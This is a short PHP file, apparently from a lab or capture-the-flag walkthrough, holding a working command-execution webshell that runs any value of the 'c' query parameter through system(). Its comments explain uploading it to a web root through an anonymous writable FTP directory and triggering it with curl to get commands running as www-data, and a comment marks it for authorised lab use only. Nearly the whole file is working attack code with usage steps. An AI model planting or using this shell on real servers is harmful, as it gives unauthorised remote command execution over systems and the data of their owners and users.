<?php
// cmd.php - minimal command-execution webshell used for the initial foothold.
//
// It is uploaded to the target's web root via the anonymous, world-writable
// FTP/HTTP directory (/var/www/html/files) and executed by the server's PHP
// handler, giving command execution as the www-data user.
//
//   Upload:  put cmd.php            (anonymous FTP, see README walkthrough)
//   Use:     curl 'http://TARGET/files/cmd.php?c=id'
//
// Authorised lab use only.
if (isset($_GET['c'])) {
    system($_GET['c']);
}
